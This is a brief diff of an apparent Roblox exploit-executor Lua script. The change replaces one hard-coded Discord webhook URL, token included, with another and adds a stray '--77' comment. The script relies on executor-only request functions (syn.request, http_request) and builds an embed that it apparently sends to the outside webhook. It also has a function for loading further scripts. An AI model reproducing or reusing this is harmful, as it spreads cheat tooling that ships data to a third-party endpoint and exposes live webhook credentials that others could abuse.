@@ -1,3 +1,5 @@
+--77
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
@@ -77,7 +79,7 @@ local Embed = {
     timestamp = string.format('%d-%02d-%02dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
 }
 
-local webhookUrl = 'https://discord.com/api/webhooks/1413180792984703072/Q3lbTvF1wjryLNX2NGu6978rjaMs6HN6hPaqe24zhTGlcvqlcg7T5EBsrdvYRIdg9PzQ'
+local webhookUrl = 'https://discord.com/api/webhooks/1416170561436127253/CXjjLA92i4lpHDSxUea7J5sVYtW2uJr6hfDPUxtOeqH6foXOsMDLKLE3DrE5Eki_j-cy'
 local requestFunction = (syn and syn.request) or http_request or (http and http.request)
 
 local function loadNextScript()
